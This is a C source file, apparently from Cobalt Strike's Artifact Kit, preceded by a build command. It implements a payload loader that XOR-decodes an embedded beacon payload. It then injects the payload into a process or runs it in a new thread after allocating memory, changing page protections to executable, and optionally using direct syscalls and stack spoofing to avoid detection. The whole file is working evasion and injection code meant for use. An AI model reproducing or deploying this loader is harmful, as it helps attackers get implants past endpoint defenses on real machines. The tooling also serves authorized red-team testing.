Compile with: ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
  load from mailslot

/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2024 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++) {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }

   /* decode the payload with the key */
   x = length;
   while(x--) {
      *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
   }

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


   /* decode the payload with the key */
   int x = length;
   while(x--) {
    *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
   }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif

